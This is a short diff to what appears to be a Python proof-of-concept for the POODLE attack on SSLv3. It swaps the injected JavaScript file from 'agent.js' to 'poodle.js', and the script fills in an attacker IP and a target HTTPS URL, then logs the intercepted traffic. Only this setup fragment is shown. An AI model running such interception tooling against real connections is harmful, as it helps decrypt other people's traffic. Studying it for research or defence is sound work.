@@ -52,7 +52,7 @@ config = json.load(open('config.json'))
 log_file = open('intercept.log', 'w')
 
 # Load the variables into the JavaScript agent that will be run on the target
-js_client_html = open('agent.js', 'r').read()
+js_client_html = open('poodle.js', 'r').read()
 js_client_html = js_client_html.replace('attackerIp', '"' + config['attacker'] + '"').replace('targetUrl', '"https://' + config['server'] + '"').replace('\n', '').replace('\r', '').replace('\t', '')
 
 def get_field(layer, field_name):
